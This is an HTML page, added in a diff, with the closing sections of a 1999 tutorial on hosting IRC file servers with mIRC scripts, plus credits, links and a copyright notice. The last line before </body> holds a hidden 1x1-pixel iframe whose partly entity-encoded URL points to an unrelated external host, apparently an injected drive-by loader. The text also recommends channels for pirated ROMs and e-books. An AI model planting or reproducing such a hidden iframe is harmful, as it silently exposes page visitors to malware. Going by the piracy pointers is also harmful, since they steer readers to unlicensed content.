+  the windows except the initial Sphoo window. Now for the last options that you 
+  need to know, go to 'Commands', &lt;&gt;SphooServer&lt;&gt; (which'll be followed 
+  by a version number), then notice the 'Disable SphooServer' option which will 
+  take SphooServer offline. And below that there is an option of 'Unload &lt;&gt;SphooServer&lt;&gt; 
+  which will completely take the Script off your mIRC client. Now if you set up 
+  your fserv right, join all the channels you've set for advertising and enjoy 
+  yourself. If you have any problems just push F12 and see if something's wrong. 
+  Just try to play with the settings 'til it works, and there is always the website 
+  <a href="http://www.Sphoo.f2s.com" target="_blank">http://www.Sphoo.f2s.com</a> 
+  which I believe the Script writer takes questions. Well, happy SphooServing!</p>
+<p> <b><a name="28"></a>C.Writing a Rules Message</b></p>
+<p> The Rules Message is one of the most important parts of a fserv. It's the 
+  way that a fserv host basically lays down the rules and it is the only time 
+  that a host will be able to communicate with a user and warn them of what will 
+  happen if they break the rules. But what's the proper way to write a Rules Message? 
+  Well, it's actually simpler than it may seem. First off, you should have some 
+  key elements - 1) Say what you offer 2) Say what you want uploaded 3) Tell what 
+  they'll get banned for 4) Tell them whether or not they can message you 5) Have 
+  your Rules Message clearly readable. Don't use stupid slang or ignorant spacing. 
+  Don't waste time and get to the point. And whatever you do, don't use ASCII 
+  art in your Rules Message, it always looks like crap. So there you go, just 
+  lay down the rules and boundries and ban them if they don't follow. Note: Some 
+  Scripts refer to the Rules Message as the Welcome Message , but it's the same 
+  thing.</p>
+<p> <b><a name="29"></a>D. Writing an Advertisement</b></p>
+<p> One of the most lucrative and oldest businesses in the world is advertising. 
+  And now it's your turn. Surprisingly the basic idea of advertising on mIRC is 
+  completely different than in the real world. How you ask? Well, for one, the 
+  channels you advertise most definately has a theme, so your not just blurting 
+  out an ad and hoping someone with that interest sees it, instead your guaranteed 
+  someone in the place will like it. So how do you go about writing it? Simple. 
+  You keep it short and to the point. Don't tell people what they'll get banned 
+  for or any of that, just tell what you offer and what you want. And list anything 
+  that will earn leech. That's it. That's a good and effective ad. For example, 
+  if your in a mp3 channel, and your serv deals mainly in rap mp3s, then your 
+  ad may say something like: !RapMusic offering: Great rap tunes by album and 
+  artist, organized well. Wanting: Any good Gansta rap and will give leech for 
+  rare Tupac mp3s. That's it. Very simple. It's short, to the point, and still 
+  interesting. And it tells people what to expect so they don't join, unless interested. 
+  By the way, the !RapMusic offering: part is something common if using Panzer 
+  Script, so don't put that in your ads. Well, that's about it. </p>
+<p><b><font size="4"><a name="30"></a>V. Final Words</font></b></p>
+<p> <b><a name="31"></a>A. In Closing...</b><br>
+  <br>
+  Proper fserving is one of the best qualities to have if you plan to enjoy your 
+  mIRC time. Whether you're just fserving or wanting to start your own, the tips 
+  and lessons in this tutorial will help you in the future. I know that fserving, 
+  and mIRC in general, is and never will be user friendly, but hopefully this 
+  tutorial, and others like it, will help make it at least seem that way. Well, 
+  feel free to distribute this tutorial in it's unedited state as you wish and 
+  visit <a href="http://www.members.tripod.com/slacker24k/" target="_blank">http://www.members.tripod.com/slacker24k/</a> 
+  for the latest versions. Also check out my other website at <a href="http://www.members.tripod.com/slacker24k/" target="_blank">http://www.the-pain.com</a> 
+  . Thank you, and enjoy yourselves. I know you will.</p>
+<p> <b><a name="32"></a>B. Credits/Shouts</b></p>
+<p> Since this is the first realease version of the 'The Proper Way to Fserv on 
+  IRC' tutorial, there aren't that many people to give credit, as I pretty much 
+  did this alone. But I guess I should at least give the software their credits 
+  (Links to them will be in the Links portion). Thanks.</p>
+<p> <b><a name="33"></a>1. The Credits</b></p>
+<p>mIRC - The greatest piece of chatting software on the planet<br>
+  Panzer Script - The easiest Script to use and what got me into fserving<br>
+  Polaris Script - The most versatile Leech Script out there<br>
+  Sphoo Script - The BEST Script on the internet<br>
+  <br>
+  <b><a name="34"></a>2. The Shouts</b></p>
+<p> <b><a name="35"></a>1. People</b></p>
+<p>the_ph34k - One of my best friends<br>
+  RastaJew - Great fserv host, awesome guy, real helpful<br>
+  phishie - A good host, but has yet to organize anything<br>
+  SuperGear - A fantastic host who is actually helpful<br>
+  RoadServ - Yet another great FServ host<br>
+  <br>
+  <b><a name="36"></a>2. DALnet Channels</b></p>
+<p>#Roms - The best place to get roms of any kind<br>
+  #bookwarez - The ONLY place to get e-books of all kinds; look for me (GueriilaServ)<br>
+  #mp3z - The best place to get Mp3s (I mean LEGAL Mp3s) </p>
+<p> <b><a name="37"></a>C. Author's Contacts</b></p>
+<p> If you want to contact me, then please do. I'd appreciate any help on improving 
+  this tutorial, whether by suggestions, or helping me fix any typos or wrong 
+  information - Yes, I admit I fuck up sometimes. So please help me out. You can 
+  reach me at the following address. </p>
+<p>Dakota@the-pain.com </p>
+<p> <b><a name="38"></a>D. Links</b></p>
+<p> Here are all the necessary links for your fserving needs. I also included 
+  some good computer-related sites and some hacking sites. Note that I do not 
+  endorse the illegal hacking of computer systems and those sites are to be used 
+  for educational uses and only educational uses. I also added some of my sites.</p>
+<p>This Tutorial's Site - <a href="http://www.members.tripod.com/slacker24k/" target="_blank">http://www.members.tripod.com/slacker24k/</a> 
+  - Come here for the latest versions<br>
+  mIRC - <a href="http://www.mirc.com" target="_blank">http://www.mirc.com</a> 
+  - Download mIRC!<br>
+  Panzer Script - <a href="http://members.tripod.com/%7EArntS/" target="_blank">http://members.tripod.com/~ArntS/</a> 
+  - Get Panzer<br>
+  Polaris Script - <a href="http://members.xoom.com/Polaris_IRC/" target="_blank">http://members.xoom.com/Polaris_IRC/</a> 
+  - Get Polaris <br>
+  Sphoo Script - <a href="http://www.sphoo.f2s.com" target="_blank">http://www.sphoo.f2s.com</a> 
+  - Get Sphoo<br>
+  mIRC-X Script Source - <a href="http://www.sphoo.f2s.com" target="_blank">http://www.mircx.com</a> 
+  - Download various types of Scripts<br>
+  New Order - <a href="http://www.sphoo.f2s.com" target="_blank">http://www.neworder.box.sk</a> 
+  - Learn anything about computers<br>
+  Black Sun - <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a> 
+  - Become a computer expert<br>
+  Happy Hacker - <a href="http://www.happyhacker.org" target="_blank">http://www.happyhacker.org</a> 
+  - Become a (mostly) Harmless Hacker<br>
+  Phrack - <a href="http://www.phrack.com" target="_blank">http://www.phrack.com</a> 
+  - Learn what the government doesn't want you to know<br>
+  Psyon - <a href="http://www.psyon.org" target="_blank">http://www.psyon.org</a> 
+  - Yet another source for all computer info<br>
+  The Pain I Feel Inside - <a href="http://www.the-pain.com" target="_blank">http://www.the-pain.com</a> 
+  - My Korn site ([{SHAMELESS PLUG}])</p>
+<p> <b><a name="39"></a>E. Updates</b><br>
+  <br>
+  This version is version 1.0. This is the first released version, so the chances 
+  of typos, errors, and just plain wrong info is high. If you see anything wrong 
+  with it please <a href="mailto:Dakota@the-pain.com">email me</a>. I'll give 
+  you some credit. All I've done since the TEST VERSION (.01b) is I added a more 
+  graphical appearance to the title, added a few more sections and I've fixed 
+  some typos. Remember, <a href="http://www.members.tripod.com/slacker24k/" target="_blank">http://www.members.tripod.com/slacker24k/</a> 
+  is the place to go for future versions/updates. That's it.</p>
+<p> <b><a name="40"></a>F. The End</b></p>
+<p> This tutorial was about as fun to write as it was difficult. It has been a 
+  long trip, but it's finally done. Please feel free to email me any suggestions, 
+  corrections, or typo alerts; I'd appreciate any feedback/input. Remember that 
+  <a href="http://www.members.tripod.com/slacker24k/" target="_blank">http://www.members.tripod.com/slacker24k/</a> 
+  is the site to go to for the latest versions. And please feel free to distribute 
+  this on your site, fserv, etc. as long as it's unedited, I don't care. Well, 
+  that's all from me. So, happy fserving to you.</p>
+<p>-Dakota Bryant<br>
+  <a href="http://www.the-pain.com" target="_blank">http://www.the-pain.com</a><br>
+  <a href="http://www.members.tripod.com/slacker24k/" target="_blank">http://www.members.tripod.com/slacker24k/</a><br>
+  <a href="mailto:Dakota@the-pain.com">Dakota@the-pain.com</a></p>
+<p>THE PRECEDING TUTORIAL IS UNDER DIRECT:</p>
+<p>COPYRIGHT 1999<br>
+  DAKOTA BRYANT<br>
+  ALL RIGHTS RESERVED</p>
+<p>THIS TUTORIAL IS PUBLIC DOMAIN AS LONG AS IT IS DISTRIBUTED IN AN UNEDITED 
+  STATE, SO FEEL FREE TO POST IT ON YOUR FSERVS, WEBSITES, NEWSGROUPS, ETC. FOR 
+  OTHERS TO DOWNLOAD. THANK YOU.</p>
+<p> &quot;You laugh at us cause we're different, we laugh at you 'cause you're 
+  all the same...&quot;</p>
+<p> -Author Unknown</p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
